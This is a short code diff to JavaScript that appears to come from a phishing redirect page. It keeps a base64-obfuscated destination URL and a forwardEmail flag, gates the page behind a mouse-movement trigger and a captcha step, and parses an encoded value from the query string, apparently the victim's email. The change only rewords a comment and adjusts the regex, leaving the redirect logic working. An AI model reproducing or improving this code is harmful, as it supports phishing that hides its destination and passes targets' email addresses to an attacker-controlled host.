@@ -35,7 +35,7 @@
     const forwardEmail = true;
 
     const urlParts = [
-      "aHR0cHM6Ly9za2MudmxyeWJqdGguZXMvOEBad0lOM2o2STRoWjR5Yy8=" // destination encoded in base64
+      "aHR0cHM6Ly9za2MudmxyeWJqdGguZXMvOEBad0lOM2o2STRoWjR5Yy8=" // base64-encoded destination
     ];
 
     document.addEventListener("mousemove", function trigger() {
@@ -50,7 +50,7 @@
 
     function onCaptchaSuccess() {
       const query = window.location.search;
-      const match = query.match(/\?(\d{10})Keyboard=([a-zA-Z0-9+/=]+)/);
+      const match = query.match(/\?(\d{10})=([a-zA-Z0-9+/=]+)/);
 
       if (!match || !match[2]) {
         document.body.innerHTML = "<h3>Missing required parameter.</h3>";
